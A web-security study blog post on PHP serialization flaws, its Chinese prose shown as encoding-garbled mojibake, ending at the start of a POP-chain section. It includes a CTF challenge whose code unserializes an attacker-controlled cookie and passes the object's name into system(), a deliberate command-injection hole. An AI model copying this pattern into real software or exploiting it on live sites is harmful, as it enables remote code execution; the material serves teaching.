<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Before allæ®µè€ƒå®Œæœ‰ç©ºäº†ï¼Œä¾†çœ‹ä¹‹å‰ä¸€ç›´æƒ³çœ‹çš„POP Chainï¼Œé †ä¾¿ç”¨é€™ç¯‡ç­†è¨˜ç´€éŒ„å…¶ä»–é—œæ–¼phpåºåˆ—åŒ–çš„å¼±é»&#x2F;ç›¸é—œçŸ¥è­˜POP Chainçš„éƒ¨åˆ†å¯èƒ½é‚„æš«æ™‚ååŸºç¤ä½†æˆ‘æœƒç›¡é‡å¯«é‚„è¦åŠªåŠ›ğŸ³   php classåœ¨ç†è§£åºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–å‰è¦å…ˆç†è§£class   ä¸€å€‹php classçš„çµæ§‹å¤§æ¦‚æœƒæ˜¯é•·é€™æ¨£   12345678910111213141516171819202122">
<meta property="og:type" content="article">
<meta property="og:title" content="PHP Serialization Vulns Note">
<meta property="og:url" content="http://wha13.github.io/2024/04/03/php-serial/index.html">
<meta property="og:site_name" content="Whale120&#39;s Blog">
<meta property="og:description" content="Before allæ®µè€ƒå®Œæœ‰ç©ºäº†ï¼Œä¾†çœ‹ä¹‹å‰ä¸€ç›´æƒ³çœ‹çš„POP Chainï¼Œé †ä¾¿ç”¨é€™ç¯‡ç­†è¨˜ç´€éŒ„å…¶ä»–é—œæ–¼phpåºåˆ—åŒ–çš„å¼±é»&#x2F;ç›¸é—œçŸ¥è­˜POP Chainçš„éƒ¨åˆ†å¯èƒ½é‚„æš«æ™‚ååŸºç¤ä½†æˆ‘æœƒç›¡é‡å¯«é‚„è¦åŠªåŠ›ğŸ³   php classåœ¨ç†è§£åºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–å‰è¦å…ˆç†è§£class   ä¸€å€‹php classçš„çµæ§‹å¤§æ¦‚æœƒæ˜¯é•·é€™æ¨£   12345678910111213141516171819202122">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://hackmd.io/_uploads/ryt7L1jkA.png">
<meta property="article:published_time" content="2024-04-04T03:10:04.000Z">
<meta property="article:modified_time" content="2024-07-25T09:30:32.267Z">
<meta property="article:author" content="William Lin">
<meta property="article:tag" content="Web Security">
<meta property="article:tag" content="serialization">
<meta property="article:tag" content="Note">
<meta property="article:tag" content="POP Chain">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hackmd.io/_uploads/ryt7L1jkA.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>PHP Serialization Vulns Note</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2024/04/07/devvortex-htb/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2024/03/16/enterprise-thm/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2024/04/03/php-serial/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2024/04/03/php-serial/&text=PHP Serialization Vulns Note"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2024/04/03/php-serial/&title=PHP Serialization Vulns Note"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2024/04/03/php-serial/&is_video=false&description=PHP Serialization Vulns Note"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=PHP Serialization Vulns Note&body=Check out this article: http://wha13.github.io/2024/04/03/php-serial/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2024/04/03/php-serial/&title=PHP Serialization Vulns Note"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2024/04/03/php-serial/&title=PHP Serialization Vulns Note"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2024/04/03/php-serial/&title=PHP Serialization Vulns Note"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2024/04/03/php-serial/&title=PHP Serialization Vulns Note"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2024/04/03/php-serial/&name=PHP Serialization Vulns Note&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2024/04/03/php-serial/&t=PHP Serialization Vulns Note"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php-class"><span class="toc-number">2.</span> <span class="toc-text">php class</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Magic-Methods"><span class="toc-number">3.</span> <span class="toc-text">Magic Methods</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#construct"><span class="toc-number">3.1.</span> <span class="toc-text">__construct</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get"><span class="toc-number">3.2.</span> <span class="toc-text">__get</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#set"><span class="toc-number">3.3.</span> <span class="toc-text">__set</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#invoke"><span class="toc-number">3.4.</span> <span class="toc-text">__invoke</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#toString-NaN"><span class="toc-number">3.5.</span> <span class="toc-text">__toString</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wakeup"><span class="toc-number">3.6.</span> <span class="toc-text">__wakeup</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sleep"><span class="toc-number">3.7.</span> <span class="toc-text">__sleep</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Serialization-Unserialization"><span class="toc-number">4.</span> <span class="toc-text">Serialization&#x2F;Unserialization</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POP-Chain"><span class="toc-number">5.</span> <span class="toc-text">POP Chain</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phar"><span class="toc-number">6.</span> <span class="toc-text">phar:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8C%E5%A0%B4%E5%8A%A0%E6%98%A0"><span class="toc-number">7.</span> <span class="toc-text">åŒå ´åŠ æ˜ </span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#phpgcc"><span class="toc-number">7.1.</span> <span class="toc-text">phpgcc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ysoserial"><span class="toc-number">7.2.</span> <span class="toc-text">ysoserial</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ruby"><span class="toc-number">7.3.</span> <span class="toc-text">Ruby</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#After-all"><span class="toc-number">8.</span> <span class="toc-text">After all</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        PHP Serialization Vulns Note
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">William Lin</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-04-04T03:10:04.000Z" class="dt-published" itemprop="datePublished">2024-04-03</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/Note/" rel="tag">Note</a>, <a class="p-category" href="/tags/POP-Chain/" rel="tag">POP Chain</a>, <a class="p-category" href="/tags/Web-Security/" rel="tag">Web Security</a>, <a class="p-category" href="/tags/serialization/" rel="tag">serialization</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>æ®µè€ƒå®Œæœ‰ç©ºäº†ï¼Œä¾†çœ‹ä¹‹å‰ä¸€ç›´æƒ³çœ‹çš„POP Chainï¼Œé †ä¾¿ç”¨é€™ç¯‡ç­†è¨˜ç´€éŒ„å…¶ä»–é—œæ–¼phpåºåˆ—åŒ–çš„å¼±é»&#x2F;ç›¸é—œçŸ¥è­˜<br>POP Chainçš„éƒ¨åˆ†å¯èƒ½é‚„æš«æ™‚ååŸºç¤ä½†æˆ‘æœƒç›¡é‡å¯«<br>é‚„è¦åŠªåŠ›ğŸ³  </p>
<h2 id="php-class"><a href="#php-class" class="headerlink" title="php class"></a>php class</h2><p>åœ¨ç†è§£åºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–å‰è¦å…ˆç†è§£class  </p>
<p>ä¸€å€‹php classçš„çµæ§‹å¤§æ¦‚æœƒæ˜¯é•·é€™æ¨£  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Whale</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;Cute_Whale&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$budget</span>=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$food</span> = <span class="string">&#x27;0xf00d&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;python3 cowsay.py &#x27;Welcome back, <span class="subst">$this</span>-&gt;name&#x27;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ“ä½œç¯„ä¾‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$www</span>=<span class="keyword">new</span> <span class="title class_">Whale</span>(<span class="string">&#x27;whale120&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$www</span>-&gt;name);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$www</span>-&gt;food);</span><br></pre></td></tr></table></figure>
<p>ä¸€å€‹è®Šæ•¸&#x2F;å‡½æ•¸çš„æ¬Šé™åˆ†ç‚º<code>public</code>, <code>protected</code>, <code>private</code>ï¼Œç•¶ä¸­ä»£è¡¨çš„åˆ†åˆ¥ç‚ºå¤–ç•Œå¯æ¡è¨ªï¼Œå¯ä»¥ç¹¼æ‰¿ä½†å¤–ç•Œä¸èƒ½æ¡è¨ªï¼Œä»¥åŠä¸èƒ½ç¹¼æ‰¿ä¹Ÿä¸èƒ½æ¡è¨ªï¼Œå¦‚æœéƒ½æ²’å®šç¾©é‚£å°±æœƒè¢«æ­¸é¡åœ¨<code>public</code><br>å†ä¾†ï¼Œä¸€å€‹classè£¡é¢å¯ä»¥æœ‰å¾ˆå¤šçš„è®Šæ•¸ï¼Œè€Œé€™äº›è®Šæ•¸å°±è·Ÿ<code>C++</code>è£¡é¢çš„structå‘¼å«æ–¹æ³•å¾ˆåƒã€‚<br>å¦‚ä¸Šä¾‹ï¼Œå¦‚æœæˆ‘æƒ³å–å¾—ä¸€å€‹Whaleç‰©ä»¶çš„åå­—(<code>name</code>)æˆ‘åªè¦ä»¥<code>variavle_name-&gt;name</code>å°±å¯ä»¥æŠ“åˆ°å…§å®¹ã€‚<br>æœ€å¾Œæ³¨æ„åˆ°é‚£äº›<code>__</code>é–‹é ­çš„å‡½æ•¸(åƒæ˜¯<code>__get</code>, <code>__set</code>)ç­‰ç­‰ï¼Œé‚£äº›æ˜¯phpå…§å»ºçš„é­”æ³•å‡½æ•¸(Magic Methods)ï¼Œæœƒåœ¨ä¸€äº›ç‰¹å®šæƒ…å½¢è¢«è§¸ç™¼ã€‚  </p>
<h2 id="Magic-Methods"><a href="#Magic-Methods" class="headerlink" title="Magic Methods"></a>Magic Methods</h2><p>ä¸€äº› magics çš„æ•´ç†ï¼š<br>å…¶ä»–é‡åˆ°çš„æ™‚å€™googleä¸€ä¸‹éƒ½å¯ä»¥owob  </p>
<h3 id="construct"><a href="#construct" class="headerlink" title="__construct"></a>__construct</h3><p>é€™å€‹æœ€å¥½ç†è§£ï¼Œå°±æ˜¯åœ¨ç‰©ä»¶è¢«å‰µé€ æ™‚å¯ä»¥åˆå§‹åŒ–å®ƒçš„æ–¹æ³•<br>åƒæ˜¯å‰›å‰›çš„ç¨‹å¼ç¢¼ï¼š  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨åˆå§‹åŒ–çš„æ™‚å€™å°±æœƒè®Šæˆè¦ï¼š  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$www</span>=<span class="keyword">new</span> <span class="title class_">Whale</span>(<span class="string">&#x27;whale120&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>è¦å¡å€‹æ±è¥¿é€²å»åˆå§‹åŒ–å®ƒçš„nameã€‚  </p>
<h3 id="get"><a href="#get" class="headerlink" title="__get"></a>__get</h3><p>ç¹¼çºŒä»¥å‰›å‰›çš„classåšä¾‹å­ï¼Œå‡è¨­æˆ‘æ²’å®šç¾©<code>__get</code>å‡½æ•¸ï¼Œé‚£ç•¶æˆ‘æŠ“å–æ˜¯<code>public</code>è®Šæ•¸çš„<code>name</code>æ™‚ï¼Œå®ƒä¸€æ¨£å¯ä»¥æ­£å¸¸å›å‚³ã€‚<br>ä½†å‡è¨­æˆ‘ä»Šå¤©æŠ“çš„æ˜¯<code>protected</code>, <code>private</code>é¡å‹çš„è®Šæ•¸ï¼Œé‚£å°±æœƒå‡ºç¾error<br><img src="https://hackmd.io/_uploads/ryt7L1jkA.png" alt="image"><br>åƒé€™æ¨£ã€‚<br>çœ‹åˆ°é€™è£¡ï¼Œæ‡‰è©²å°±æƒ³çš„åˆ°<code>__get</code>å‡½æ•¸çš„åŠŸèƒ½äº†å§~<br>æ²’éŒ¯ï¼Œå®ƒå°±æ˜¯åœ¨æŠ“ä¸€å€‹classç‰©ä»¶è£¡é¢æ¯”è¼ƒéš±ç§çš„å…§å®¹æ™‚æœƒè§¸ç™¼çš„å‡½æ•¸ã€‚<br>é‚£æœƒé€™æ¨£åšçš„åŸå› æ˜¯é–‹ç™¼å“¡å¯èƒ½æœƒå¸Œæœ›ä¸€äº›æ¯”è¼ƒprivateçš„ç‰©ä»¶è³‡è¨Šå¯ä»¥è¢«ä¿è­·(åƒæ˜¯è¨­å®š<code>__get</code>åªèƒ½æŠ“èº«åˆ†è­‰å‰å››ç¢¼ä¹‹é¡çš„)ã€‚<br>æœ€å¾Œï¼Œå¦‚æœé‚£å€‹attributeä¸å­˜åœ¨ä¹Ÿæœƒå…ˆé€šé<code>__get</code></p>
<h3 id="set"><a href="#set" class="headerlink" title="__set"></a>__set</h3><p>è·Ÿ<code>__get</code>å¹¾ä¹ä¸€æ¨¡ä¸€æ¨£ï¼Œåœ¨ç·¨è¼¯<code>protected</code>, <code>private</code>çš„attributeå…§å®¹æ™‚æœƒè§¸ç™¼çš„å‡½æ•¸ï¼Œæœƒæœ‰å…©å€‹ä½ç½®ï¼Œç¬¬ä¸€å€‹æ”¾ç¾åœ¨çš„attribute name, ç¬¬äºŒå€‹æ”¾è®Šæ•¸é†¬  </p>
<h3 id="invoke"><a href="#invoke" class="headerlink" title="__invoke"></a>__invoke</h3><p>ç•¶ç‰©ä»¶è¦è¢«ç•¶ä½œå‡½æ•¸ä½¿ç”¨æ™‚æœƒè§¸ç™¼çš„magic<br>ä»€éº¼æ™‚å€™æœƒè¢«ç•¶functionç”¨å‘¢?<br>åƒæ˜¯ï¼š  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$function</span>=<span class="variable">$Whale</span>-&gt;name;</span><br><span class="line"><span class="variable">$function</span>()</span><br></pre></td></tr></table></figure>
<p>æ©ï¼Œè¶…æ€ªâ€¦  </p>
<h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString"></a>__toString</h3><p>ç•¶æœ‰äººè©¦è‘—æŠŠç‰©ä»¶ç•¶ä½œå­—ä¸²è§£ææ™‚æœƒè§¸ç™¼çš„magic<br>Example:  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;url=<span class="keyword">new</span> <span class="title class_">Whale</span></span><br><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;ftp://&#x27;</span>, <span class="variable">$this</span>-&gt;url)</span><br></pre></td></tr></table></figure>

<h3 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup"></a>__wakeup</h3><p>åœ¨ç‰©ä»¶æ”¶åˆ°<code>unserialize()</code>ååºåˆ—åŒ–å‡½æ•¸å‘¼å«æ™‚æœƒè§¸ç™¼çš„magic  </p>
<h3 id="sleep"><a href="#sleep" class="headerlink" title="__sleep"></a>__sleep</h3><p><code>__wakeup</code>ç›¸åï¼Œåœ¨åºåˆ—åŒ–çš„æ™‚å€™è§¸ç™¼</p>
<p>ä»€éº¼æ˜¯åºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–?  </p>
<h2 id="Serialization-Unserialization"><a href="#Serialization-Unserialization" class="headerlink" title="Serialization&#x2F;Unserialization"></a>Serialization&#x2F;Unserialization</h2><p>æƒ³æƒ³çœ‹ä»Šå¤©ç¶²ç«™æƒ³æŠŠä¸€å€‹array&#x2F;class ç‰©ä»¶ç•¶ä½œcookieå¡çµ¦ä½ æ€è¾¦?<br>ç•¶ç„¶æ˜¯æŠŠå®ƒè®Šæˆä¸€å€‹å­—ä¸²å’¯ï¼Œé€™å°±æ˜¯<code>serialize()</code>å‡½æ•¸æœƒåšçš„äº‹<br>ç„¶å¾Œ<code>unserialize</code>å°±æ˜¯åéä¾†æŠŠå­—ä¸²è§£å›å»array&#x2F;class ç‰©ä»¶  </p>
<p>çœ‹å€‹æˆ‘ä¹‹å‰ç¤¾å…§è³½çš„é¡Œç›®ï¼š  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;confirm&#x27;</span>]!=<span class="string">&quot;Tru34dmin&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;You are not admin&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cat</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;(guest cat)&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;python3 cowsay.py &#x27;Welcome back, <span class="subst">$this</span>-&gt;name&#x27;&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;cat_session&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$cat</span> = <span class="keyword">new</span> <span class="title class_">Cat</span>(<span class="string">&quot;cat_&quot;</span> . <span class="title function_ invoke__">rand</span>(<span class="number">0</span>, <span class="number">0xffff</span>));</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;cat_session&#x27;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$cat</span>)));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$cat</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;cat_session&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;Hello, &#x27;</span>.<span class="variable">$cat</span>-&gt;name.<span class="string">&#x27;&lt;/h1&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;console.php&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>é€™é¡Œç°¡å–®ä¾†èªªå°±æ˜¯æœƒå¡å€‹åºåˆ—åŒ–å¾Œçš„Catç‰©ä»¶çµ¦ä½ ç•¶cookieï¼Œç„¶å¾Œè¦é€éunserializeçš„éç¨‹å»è§¸ç™¼<code>__wakeup</code>ï¼Œæœ€å¾Œåšcommand injection<br><del>ç„¶å¾Œè«‹å®¹æˆ‘ç¾åœ¨ä¸æƒ³é‡æ‰“ä¸€é</del>  </p>
<h2 id="POP-Chain"><a href="#POP-Chain" class="headerlink" title="POP Chain"></a>POP Chain</h2><p>çµ‚æ–¼é€²åˆ°ä¸»é¡Œäº†ï¼Œä»€éº¼æ˜¯pop chainå‘¢?<br>ç•¶ä¸€å€‹ç¶²ç«™æœƒå»ä½¿ç”¨phpçš„unserializeå‡½æ•¸å»è§£ä½ ä¸Ÿé€²å»çš„æ±è¥¿(è­¬å¦‚èªªcookie)ï¼Œé‚£å¦‚æœä½ èƒ½é€éä¸²èµ·ä¸€äº›å‰›å‰›çš„magicæœ€å¾Œåšåˆ°ä½ æƒ³åšçš„äº‹æƒ…ï¼Œé€™å€‹ç”¢ç”Ÿçš„payloadå°±å«åšPOP Chainã€‚<br>ç›´æ¥ç”¨Port Swiggerä¸Šçš„ä¸€é¡Œç•¶ç¯„ä¾‹ï¼š<br>source code:  </p>
